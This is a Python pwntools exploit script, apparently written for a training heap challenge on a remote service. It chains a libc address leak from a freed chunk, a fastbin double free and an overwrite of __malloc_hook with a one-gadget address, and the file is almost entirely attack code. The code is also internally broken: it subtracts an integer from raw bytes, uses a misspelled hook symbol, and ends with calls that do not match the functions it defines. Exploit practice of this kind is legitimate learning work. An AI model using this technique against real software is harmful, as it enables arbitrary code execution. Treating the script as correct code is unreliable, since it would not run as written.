from pwn import *

LEAK_OFFSET = 0x3c4b78
MALLOC_HOOK_OFFSET = 0x3c4b10
DELTA_HOOK = 0x23
MAGIC = 0xf1247
libc = ELF("./libc-2.23.so")

#def alloc(c,size):
    #c.recvuntil("> ")
    #c.sendline("1")
    #c.recvuntil("Size: ")
    #c.sendline(str(size))

#def write(c,index,data):
#    c.recvuntil("> ")
#    c.sendline("2")
#    c.recvuntil("Index: ")
#    c.sendline(str(index))
#    c.recvuntil("Content: ")
#    c.send(data)

#def write(c,index, content):
    #c.recvuntil(b"> ")
    #c.sendline(b"2")
    #c.recvuntil(b"Index: ")
    #c.sendline(b"%d" % index)
    #c.recvuntil(b"Content: ")
    #c.send(content)
    #c.recvuntil(b"Done")

#def read(c, index):
#    c.recvuntil("> ")
#    c.sendline("3")
#    c.recvuntil("Index: ")
#    c.sendline(str(index))
#    return c.recvuntil("\nOptions: ").split(b"\nOptions:")[0]


#def read(c,index):
    #c.recvuntil(b"> ")
    #c.sendline(b"3")
    #c.recvuntil(b"Index: ")
    #c.sendline(b"%d" % index)
    #data = c.recvuntil(b"Options:\n")
    #return data[:-len(b"Options:\n")]


#def free(c,index):
    #c.recvuntil("> ")
    #c.sendline("4")
    #c.recvuntil("Index: ")
    #c.sendline(str(index))

#context.terminal = ['tmux', 'splitw', '-h']
#ssh = shh("acidburn","192.168.56.103")

#c =  ssh.process("./fastbin_attack")
c = remote("training.jinblack.it",10101)
#gdb.attach(c,'''
                #b *0x000401200
#                c
#             ''')

def alloc(size):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Size: ")
    c.sendline(b"%d" % size)
    #we need to retrieve the index
    indexline = c.recvuntil("!")
    m = re.match(b"Allocated at index (\d+)!",indexline )
    return int(m.group(1))
    input("Press a key")


def write_chunk(index, content):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"Index: ")
    c.sendline(b"%d" % index)
    c.recvuntil(b"Content: ")
    c.send(content)
    #c.recvuntil(b"Done")

def read_chunk(index):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"Index: ")
    c.sendline(b"%d" % index)
    data = c.recvuntil(b"Options:\n")
    return data[:-len(b"Options:\n")]

def free_chunk(index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"Index: ")
    c.sendline(b"%d" % index)
input("wait")


chunk_a = alloc(0x200)#fastbin doesn't have libc addr so it needs to be big
chunk_b = alloc(0x300)
free_chunk(chunk_a)
libc_leak = read_chunk(chunk_a)[:6]+b"\x00\x00"#print(chunk_a, read_chunk(chunk_a))
libc_base = libc_leak - 0x3c4b78

libc.address = libc_base
free_hook = libc.symbols["__free_hook"]
malloc_hook = libc.symbols["__malloc_hook_"]

target = malloc_hook -0x23

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
print("[!] __free_hook_: %#x" % free_hook)
print("[!] __malloc_hook_: %#x" % malloc_hook)
print("[!] target : %#x" % target)

SIZE = 0x60

input("before allocation")

chunk_1 = alloc(SIZE)
chunk_2 = alloc(SIZE)

input("before free")

free_chunk(chunk_1)
free_chunk(chunk_2)

input("before double free")

free_chunk(chunk_1)

input("before allocation ")

chunk_A = alloc(SIZE)

input("before write")

#write_chunk(chunk_A,b"A"*8)#we'll try to write something in the __free_hook we now have a pointer to it
write_chunk(chunk_A, p64(target))# REMEMBER TO CHANGE IT!!!!!

input("after write")
chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE)

input("TRIGGER")
chunk_D = alloc(SIZE)

#alloc(c, 0x60) # index 0
#alloc(c, 0x60) # index 1
#free(c,0)
#free(c,1)
#free(c,0)

#leak libc
#alloc(c,0xa0) #index 2
#alloc(c,0x20) #index 3
#free(c,2) # index 2 in DLL
#leak = read(c,2) # leak of libc
#leak = u64(leak.ljust(8,b"\x00"))
#libc_base = leak - LEAK_OFFSET
#target = libc_base + 0x3c4af5

#print("Libc_base: " + hex(libc_base))

#writing __malloc_hook_
#alloc(c,0x60) # index 4
#alloc(c, 0x60) # index 5
#write(c, 4, p64(target))
#alloc(c, 0x60) #index 6

alloc(c,0x60) # index 7
payload = b"A" *(DELTA_HOOK-0x10)
payload += p64(libc_base+ MAGIC)
write(c,7,payload)

c.interactive()
